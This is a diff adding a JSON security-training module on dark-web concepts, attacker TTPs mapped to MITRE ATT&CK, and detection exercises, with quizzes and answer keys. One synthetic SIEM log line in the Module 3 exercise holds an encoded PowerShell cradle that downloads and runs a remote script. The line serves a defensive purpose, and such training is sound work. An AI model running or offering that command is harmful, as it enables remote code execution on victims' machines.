@@ -1,0 +1,418 @@
+{
+  "tool_name": "Dark-Web Terminology & TTP Trainer",
+  "version": "0.1.0",
+  "purpose": "Educational OSINT tool for learning deep/dark web concepts without accessing illicit content",
+  "legal_disclaimer": "This tool uses only synthetic data and publicly documented concepts for educational purposes. It does not access the dark web or any illicit content.",
+  "modules": [
+    {
+      "module_id": "M1",
+      "title": "Surface vs Deep vs Dark Web",
+      "type": "conceptual",
+      "content": {
+        "definitions": {
+          "surface_web": "Public websites indexed by search engines (Google, Bing). Examples: news sites, social media, e-commerce.",
+          "deep_web": "Content not indexed by search engines. Includes email inboxes, paywalled content, private databases, internal portals. ~90%+ of internet.",
+          "dark_web": "Hidden subset of deep web requiring special software (Tor). Uses .onion domains. Designed for anonymity. Hosts both legitimate privacy services and illicit markets."
+        },
+        "key_differences": [
+          "Surface web: indexed, public, standard browsers",
+          "Deep web: unindexed, private/auth-required, standard browsers",
+          "Dark web: hidden, anonymized, requires Tor/special protocols"
+        ],
+        "quiz": [
+          {
+            "question": "Which layer of the web includes your email inbox?",
+            "options": [
+              "Surface web",
+              "Deep web",
+              "Dark web"
+            ],
+            "correct": 1,
+            "explanation": "Email inboxes are not indexed by search engines and require authentication, making them part of the deep web."
+          },
+          {
+            "question": "What software is required to access .onion domains?",
+            "options": [
+              "Chrome",
+              "Tor Browser",
+              "Firefox"
+            ],
+            "correct": 1,
+            "explanation": ".onion domains are only accessible through the Tor Browser or compatible Tor clients."
+          },
+          {
+            "question": "True or False: The dark web and deep web are the same thing.",
+            "options": [
+              "True",
+              "False"
+            ],
+            "correct": 1,
+            "explanation": "They are different. The deep web is all unindexed content; the dark web is a small, anonymized subset requiring special software."
+          }
+        ]
+      }
+    },
+    {
+      "module_id": "M2",
+      "title": "Dark-Web Ecosystem & Service Types",
+      "type": "conceptual",
+      "content": {
+        "service_categories": {
+          "illicit_markets": {
+            "description": "Marketplaces selling stolen credentials, malware, phishing kits, exploits",
+            "examples_synthetic": [
+              "AlphaBay (defunct)",
+              "DreamMarket (defunct)",
+              "Empire (defunct)"
+            ],
+            "detection_relevance": "Source of initial access tools, credential stuffing campaigns, phishing infrastructure"
+          },
+          "forums": {
+            "description": "Discussion boards for threat actors to share TTPs, tools, and coordinate",
+            "examples_synthetic": [
+              "BreachForums",
+              "RaidForums (defunct)"
+            ],
+            "detection_relevance": "Early indicators of campaigns, tool development, vendor targeting"
+          },
+          "privacy_services": {
+            "description": "Legitimate anonymity tools, secure email, censorship-resistant hosting",
+            "examples_synthetic": [
+              "ProtonMail onion mirror",
+              "SecureDrop instances"
+            ],
+            "detection_relevance": "Understanding dual-use infrastructure; not all dark web activity is malicious"
+          },
+          "whistleblowing": {
+            "description": "Secure drop sites for journalists and activists",
+            "examples_synthetic": [
+              "The Intercept SecureDrop",
+              "Media organization onion sites"
+            ],
+            "detection_relevance": "Legitimate use cases; important for threat intel context"
+          },
+          "mirrors": {
+            "description": "Censorship-resistant mirrors of surface-web services (news, social media)",
+            "examples_synthetic": [
+              "BBC Tor mirror",
+              "Facebook onion service",
+              "ProPublica onion"
+            ],
+            "detection_relevance": "Understanding onion service architecture; some are legitimate"
+          }
+        },
+        "quiz": [
+          {
+            "question": "Which dark-web service type is most relevant for early campaign indicators?",
+            "options": [
+              "Privacy services",
+              "Forums",
+              "Mirrors",
+              "Whistleblowing sites"
+            ],
+            "correct": 1,
+            "explanation": "Forums often contain discussions about upcoming campaigns, tool development, and targeting strategies."
+          },
+          {
+            "question": "True or False: All dark-web services are illegal.",
+            "options": [
+              "True",
+              "False"
+            ],
+            "correct": 1,
+            "explanation": "False. Many dark-web services are legitimate privacy tools, news mirrors, or whistleblowing platforms."
+          }
+        ]
+      }
+    },
+    {
+      "module_id": "M3",
+      "title": "TTPs Originating from Dark-Web Ecosystems",
+      "type": "technical",
+      "content": {
+        "ttps": [
+          {
+            "ttp_id": "TTP-001",
+            "name": "Credential Stuffing from Leaked Databases",
+            "description": "Threat actors purchase leaked credentials from dark-web markets and automate login attempts across multiple services.",
+            "mitre_mapping": [
+              "T1110.004 - Credential Stuffing"
+            ],
+            "detection_hypothesis": "High volume of failed logins from diverse IPs targeting same accounts; geographic anomalies in login attempts",
+            "data_sources": [
+              "Authentication logs",
+              "Proxy logs",
+              "EDR process creation"
+            ],
+            "synthetic_indicators": {
+              "log_example": "2026-10-02 08:15:23 FAILED_LOGIN user=jsmith src_ip=185.220.101.45 geo=RO attempt=47",
+              "pattern": "Multiple failed logins (>10) within 5 minutes from geographically dispersed IPs"
+            }
+          },
+          {
+            "ttp_id": "TTP-002",
+            "name": "Phishing Kit Distribution via Dark-Web Markets",
+            "description": "Ready-to-deploy phishing kits (landing pages, credential harvesters, email templates) sold on dark-web marketplaces.",
+            "mitre_mapping": [
+              "T1566 - Phishing",
+              "T1539 - Steal Web Session Cookie"
+            ],
+            "detection_hypothesis": "Newly registered domains with lookalike branding; suspicious email attachments with credential harvesting forms",
+            "data_sources": [
+              "Email gateway logs",
+              "DNS query logs",
+              "Web proxy logs"
+            ],
+            "synthetic_indicators": {
+              "log_example": "2026-10-02 09:42:11 DNS_QUERY domain=paypa1-secure.com client=10.0.5.23 category=newly_registered",
+              "pattern": "Domains registered <7 days ago with typosquatting patterns targeting financial brands"
+            }
+          },
+          {
+            "ttp_id": "TTP-003",
+            "name": "Initial Access Brokering",
+            "description": "Threat actors sell access to compromised corporate networks (via RDP, VPN, web shells) acquired through dark-web channels.",
+            "mitre_mapping": [
+              "T1078 - Valid Accounts",
+              "T1190 - Exploit Public-Facing Application"
+            ],
+            "detection_hypothesis": "Unusual RDP/VPN connections from unexpected geolocations; web shell artifacts on internet-facing servers",
+            "data_sources": [
+              "Firewall logs",
+              "VPN logs",
+              "EDR network connections"
+            ],
+            "synthetic_indicators": {
+              "log_example": "2026-10-02 03:22:05 VPN_CONNECT user=svc_backup src_ip=45.155.205.89 geo=NL time=03:22 local_time=22:22_prev_day",
+              "pattern": "Service account VPN connections from non-corporate IPs during off-hours"
+            }
+          },
+          {
+            "ttp_id": "TTP-004",
+            "name": "Malware-as-a-Service (MaaS)",
+            "description": "Ransomware, info-stealers, and RATs offered via subscription or affiliate programs on dark-web forums.",
+            "mitre_mapping": [
+              "T1587.001 - Develop Capabilities: Malware",
+              "T1595 - Active Scanning"
+            ],
+            "detection_hypothesis": "Known malware signatures; suspicious PowerShell/LOLBin usage; C2 beaconing patterns",
+            "data_sources": [
+              "EDR telemetry",
+              "Network flow logs",
+              "Sandbox analysis"
+            ],
+            "synthetic_indicators": {
+              "log_example": "2026-10-02 10:05:33 PROCESS_CREATE parent=explorer.exe image=powershell.exe cmdline=-enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
+              "pattern": "Encoded PowerShell commands spawned from office applications or browsers"
+            }
+          }
+        ],
+        "detection_exercise": {
+          "scenario": "You observe the following log entries in your SIEM over a 2-hour window. Identify which TTP(s) might be occurring and write a detection rule.",
+          "log_entries": [
+            "2026-10-02 08:15:23 FAILED_LOGIN user=jsmith src_ip=185.220.101.45 geo=RO attempt=47",
+            "2026-10-02 08:16:01 FAILED_LOGIN user=jsmith src_ip=91.219.236.12 geo=UA attempt=48",
+            "2026-10-02 08:16:45 FAILED_LOGIN user=jsmith src_ip=45.155.205.89 geo=NL attempt=49",
+            "2026-10-02 08:17:22 SUCCESS_LOGIN user=jsmith src_ip=185.220.101.45 geo=RO",
+            "2026-10-02 08:18:05 FILE_ACCESS user=jsmith path=\\\\fileserver\\finance\\Q3_budget.xlsx",
+            "2026-10-02 08:20:33 PROCESS_CREATE parent=excel.exe image=powershell.exe cmdline=-enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
+          ],
+          "expected_ttps": [
+            "TTP-001",
+            "TTP-004"
+          ],
+          "detection_rule_template": {
+            "name": "Credential Stuffing Followed by Suspicious PowerShell",
+            "logic": "ALERT IF (failed_logins > 10 within 5 minutes for same user) AND (success_login from same IP as failed attempts) AND (powershell.exe spawned from office app with encoded command)",
+            "data_sources": [
+              "Authentication logs",
+              "EDR process creation"
+            ],
+            "severity": "HIGH",
+            "false_positives": "Legitimate penetration testing; password manager testing; user traveling internationally"
+          }
+        }
+      }
+    },
+    {
+      "module_id": "M4",
+      "title": "OSINT Workflow Simulation",
+      "type": "hands_on",
+      "content": {
+        "scenario": {
+          "title": "Investigate a Dark-Web Mention in Threat Intel Report",
+          "background": "Your threat intel team received a report mentioning a new phishing kit being sold on a dark-web marketplace. The report includes a synthetic .onion address and vendor name.",
+          "synthetic_intel": {
+            "report_date": "2026-09-28",
+            "source": "Vendor Threat Blog (public)",
+            "onion_address": "phishkit7x3m2k4n5o6p7q8r9s0t1u2v3w4x5y6z.onion",
+            "vendor_name": "DarkPhish Pro",
+            "claimed_capabilities": [
+              "Banking trojan",
+              "Credential harvester",
+              "Anti-VM detection"
+            ],
+            "price": "$500/month",
+            "first_seen": "2026-09-15"
+          }
+        },
+        "workflow_steps": [
+          {
+            "step": 1,
+            "action": "Validate the source",
+            "guidance": "Check if the threat intel vendor is reputable. Look for corroborating reports from other vendors.",
+            "synthetic_output": {
+              "vendor_reputation": "Established threat intel provider",
+              "corroborating_reports": 2,
+              "confidence": "MEDIUM-HIGH"
+            }
+          },
+          {
+            "step": 2,
+            "action": "Search surface-web mentions",
+            "guidance": "Search for the vendor name and .onion address in public sources (news, blogs, forums).",
+            "synthetic_output": {
+              "mentions_found": [
+                {
+                  "source": "ThreatBlog A",
+                  "date": "2026-09-20",
+                  "context": "Mentioned as new phishing kit vendor"
+                },
+                {
+                  "source": "Security Researcher X (Twitter)",
+                  "date": "2026-09-22",
+                  "context": "Shared screenshot of marketplace listing"
+                },
+                {
+                  "source": "MalwareTech Blog",
+                  "date": "2026-09-25",
+                  "context": "Analyzed sample attributed to DarkPhish Pro"
+                }
+              ]
+            }
+          },
+          {
+            "step": 3,
+            "action": "Check for associated campaigns",
+            "guidance": "Search for phishing campaigns using similar TTPs or infrastructure in your telemetry.",
+            "synthetic_output": {
+              "potential_matches": [
+                {
+                  "campaign_id": "PHISH-2026-0923",
+                  "similarity": "High - same banking trojan signature",
+                  "victims": 12
+                },
+                {
+                  "campaign_id": "PHISH-2026-0927",
+                  "similarity": "Medium - similar email templates",
+                  "victims": 5
+                }
+              ]
+            }
+          },
+          {
+            "step": 4,
+            "action": "Write detection hypotheses",
+            "guidance": "Based on claimed capabilities, what would you expect to see in logs?",
+            "synthetic_output": {
+              "hypotheses": [
+                "Increased phishing emails with banking-themed lures",
+                "PowerShell downloads from newly registered domains",
+                "Encoded commands spawned from Outlook/Word",
+                "C2 beaconing to IPs in bulletproof hosting ranges"
+              ]
+            }
+          },
+          {
+            "step": 5,
+            "action": "Document findings",
+            "guidance": "Create a brief intelligence summary for your team.",
+            "synthetic_output": {
+              "summary_template": "A new phishing kit vendor 'DarkPhish Pro' has been reported selling banking trojans on dark-web marketplaces since 2026-09-15. Corroborating reports from 3 sources suggest active campaigns. Recommend monitoring for [hypotheses list] and updating email filtering rules for banking-themed lures."
+            }
+          }
+        ],
+        "deliverable": {
+          "type": "Markdown report",
+          "sections": [
+            "Executive Summary",
+            "Threat Actor/Tool Profile",
+            "Observed Activity",
+            "Detection Hypotheses",
+            "Recommended Actions"
+          ]
+        }
+      }
+    }
+  ],
+  "assessment": {
+    "final_quiz": [
+      {
+        "question": "Which of the following is NOT a legitimate use case for the dark web?",
+        "options": [
+          "Whistleblowing platforms",
+          "Censorship-resistant news mirrors",
+          "Selling stolen credentials",
+          "Secure email services"
+        ],
+        "correct": 2,
+        "explanation": "Selling stolen credentials is illegal. Whistleblowing, news mirrors, and secure email are legitimate privacy-focused uses."
+      },
+      {
+        "question": "What is the primary detection hypothesis for credential stuffing attacks?",
+        "options": [
+          "Single failed login from unusual location",
+          "Multiple failed logins from diverse IPs targeting same accounts",
+          "Successful login during business hours",
+          "Password change request"
+        ],
+        "correct": 1,
+        "explanation": "Credential stuffing involves automated login attempts from many IPs against the same accounts, resulting in high volumes of failed logins."
+      },
+      {
+        "question": "In the OSINT workflow, what is the first step after receiving dark-web threat intel?",
+        "options": [
+          "Access the .onion site directly",
+          "Validate the source and check for corroboration",
+          "Block all .onion traffic",
+          "Notify law enforcement"
+        ],
+        "correct": 1,
+        "explanation": "Always validate the source and look for corroborating reports before taking action or investing investigation time."
+      }
+    ],
+    "practical_exercise": {
+      "task": "Write a detection rule for one of the TTPs covered in Module 3",
+      "requirements": [
+        "Rule name and description",
+        "Logic/pseudocode",
+        "Data sources required",
+        "Severity level",
+        "At least 2 potential false positives"
+      ],
+      "example_solution": {
+        "name": "Dark-Web Sourced Phishing Kit Detection",
+        "logic": "ALERT IF (email contains banking-themed subject line) AND (attachment is HTML/JS with external form POST) AND (sender domain registered <7 days ago)",
+        "data_sources": [
+          "Email gateway logs",
+          "DNS registration data",
+          "Sandbox analysis"
+        ],
+        "severity": "HIGH",
+        "false_positives": [
+          "Legitimate marketing campaigns from new domains",
+          "Password reset emails from newly configured services"
+        ]
+      }
+    }
+  },
+  "usage_instructions": {
+    "how_to_run": "This is a JSON-based prototype. Load it in a Python script or Jupyter notebook to interact with the content programmatically.",
+    "next_steps": [
+      "Convert to interactive web app (Streamlit/Flask)",
+      "Add more TTPs and scenarios",
+      "Implement auto-grading for quizzes",
+      "Create PDF export for lab reports"
+    ]
+  }
+}
